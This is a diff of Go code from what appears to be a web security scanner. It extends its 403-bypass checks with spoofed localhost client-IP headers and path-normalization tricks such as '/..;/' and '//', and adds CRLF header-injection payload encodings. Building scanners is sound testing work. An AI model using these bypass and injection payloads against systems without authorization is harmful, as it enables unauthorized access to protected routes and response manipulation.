@@ -882,12 +882,25 @@ func check403Bypass(ctx context.Context, rawURL string) (method, evidence string
 		{label: "X-Originating-IP: 127.0.0.1", headers: map[string]string{"X-Originating-IP": "127.0.0.1"}},
 		{label: "X-Client-IP: 127.0.0.1", headers: map[string]string{"X-Client-IP": "127.0.0.1"}},
 		{label: "True-Client-IP: 127.0.0.1", headers: map[string]string{"True-Client-IP": "127.0.0.1"}},
+		{label: "Client-IP: 127.0.0.1", headers: map[string]string{"Client-IP": "127.0.0.1"}},
+		{label: "X-Cluster-Client-IP: 127.0.0.1", headers: map[string]string{"X-Cluster-Client-IP": "127.0.0.1"}},
+		{label: "CF-Connecting-IP: 127.0.0.1", headers: map[string]string{"CF-Connecting-IP": "127.0.0.1"}},
+		{label: "X-ProxyUser-Ip: 127.0.0.1", headers: map[string]string{"X-ProxyUser-Ip": "127.0.0.1"}},
 		{label: "Forwarded: for=127.0.0.1", headers: map[string]string{"Forwarded": "for=127.0.0.1;host=" + parsed.Host}},
 		{label: "path_suffix /", path: mutate403Path(parsed, strings.TrimRight(parsed.EscapedPath(), "/")+"/")},
 		{label: "path_suffix /.", path: mutate403Path(parsed, strings.TrimRight(parsed.EscapedPath(), "/")+"/.")},
 		{label: "path_suffix /.;", path: mutate403Path(parsed, strings.TrimRight(parsed.EscapedPath(), "/")+"/.;/")},
 		{label: "path_suffix ;/", path: mutate403Path(parsed, strings.TrimRight(parsed.EscapedPath(), "/")+";/")},
 		{label: "path_suffix %2f", path: mutate403Path(parsed, strings.TrimRight(parsed.EscapedPath(), "/")+"%2f")},
+		// Tomcat/Spring path-normalization bypass: a `/..;/` segment is stripped by
+		// the security filter but re-added by the servlet mapper, reaching the
+		// protected route. Each still goes through the same two-control-200 proof.
+		{label: "path_suffix /..;/", path: mutate403Path(parsed, strings.TrimRight(parsed.EscapedPath(), "/")+"/..;/")},
+		// Leading double-slash and dot-slash: a front-end ACL keyed on the exact
+		// path misses the normalized-equivalent form the back-end still resolves.
+		{label: "path_prefix //", path: mutate403Path(parsed, "//"+strings.TrimLeft(parsed.EscapedPath(), "/"))},
+		{label: "path_prefix /./", path: mutate403Path(parsed, "/./"+strings.TrimLeft(parsed.EscapedPath(), "/"))},
+		{label: "path_suffix /%2e", path: mutate403Path(parsed, strings.TrimRight(parsed.EscapedPath(), "/")+"/%2e")},
 	}
 
 	type attemptResult struct {
@@ -1327,11 +1340,13 @@ func crlfPayloads(name, value string) []string {
 	return []string{
 		"%0d%0a" + header,
 		"%0a" + header,
+		"%0d" + header, // bare CR — servers that split on CR alone
 		"\r\n" + header,
 		"%250d%250a" + header,         // double-decoding chains
 		"%25250d%25250a" + header,     // triple-decoding chains
 		"%%0d0a" + header,             // legacy percent-normalisation chains
-		"%E5%98%8A%E5%98%8D" + header, // Unicode CR/LF normalization
+		"%E5%98%8A%E5%98%8D" + header, // Unicode CR/LF normalization (U+560A/U+560D)
+		"%u000d%u000a" + header,       // IIS/.NET %uXXXX escape normalization
 	}
 }
 
